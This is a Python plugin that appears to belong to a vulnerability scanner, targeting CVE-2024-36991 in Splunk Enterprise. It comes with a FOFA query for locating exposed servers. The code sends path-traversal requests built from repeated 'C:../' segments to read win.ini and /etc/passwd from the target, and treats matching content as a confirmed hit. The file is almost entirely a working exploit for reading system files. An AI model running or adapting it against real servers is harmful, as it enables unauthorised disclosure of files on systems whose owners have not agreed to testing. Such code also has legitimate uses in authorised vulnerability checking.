#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/LioQSSZHfznrZ2ZDJS1O6A',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Splunk Enterprise任意文件读取 CVE-2024-36991',

      'level'     :   'medium',

      'FOFA'      :   'app="splunk-Enterprise"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/9',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target1 = '/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini'
  target2 = '/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd'
  url1 = url + target1
  url2 = url + target2
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['url'] = url2
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret